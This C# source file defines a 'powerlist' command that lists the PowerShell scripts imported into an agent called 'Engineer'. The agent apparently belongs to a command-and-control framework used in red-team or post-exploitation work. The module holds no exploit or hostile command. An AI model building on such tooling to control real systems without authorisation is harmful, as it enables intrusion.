using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class PowerList : EngineerCommand
    {
        public override string Name => "powerlist";

        public override async Task Execute(EngineerTask task)
        {
            //if there are vales in the Powershell_import.ImportedScriptsTracking list, then ruturn the values in a format where the first row is a header like Key : Value, then each line is a key and its value
            if (PowershellImport.ImportedScriptsTracking.Count > 0)
            {
                string output = "Key : Value" + Environment.NewLine;
                foreach (KeyValuePair<int, string> item in PowershellImport.ImportedScriptsTracking)
                {
                    output += item.Key.ToString() + " : " + item.Value + Environment.NewLine;
                }
                Tasking.FillTaskResults(output,task,EngTaskStatus.Complete);
            }
            else
            {
                Tasking.FillTaskResults("No scripts have been imported yet",task,EngTaskStatus.Failed);
            }


        }
    }
}
